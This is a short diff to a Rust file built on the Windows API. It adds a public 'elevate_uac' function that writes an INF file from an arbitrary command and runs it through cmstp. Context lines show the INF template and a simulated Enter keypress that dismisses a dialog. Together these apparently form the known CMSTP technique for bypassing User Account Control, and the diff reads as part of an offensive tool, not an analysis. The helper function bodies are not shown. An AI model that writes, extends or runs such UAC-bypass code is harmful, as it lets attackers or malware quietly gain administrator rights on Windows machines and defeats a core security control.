@@ -13,6 +13,8 @@ use winapi::um::winuser::{
 };
 use winapi::um::winuser::{SendInput, INPUT, INPUT_KEYBOARD, KEYBDINPUT, VK_RETURN};
 
+
+
 static INF_TEMPLATE: &str = r#"[version]
 Signature=$chicago$
 AdvancedINF=2.5
@@ -124,4 +126,8 @@ fn simulate_keypress() {
 
         SendInput(1, &mut input, std::mem::size_of::<INPUT>() as i32);
     }
+}
+pub fn elevate_uac(command: &String){
+    let inf_file = self::generate_inf_file(&command);
+    self::execute_cmstp(&inf_file);
 }
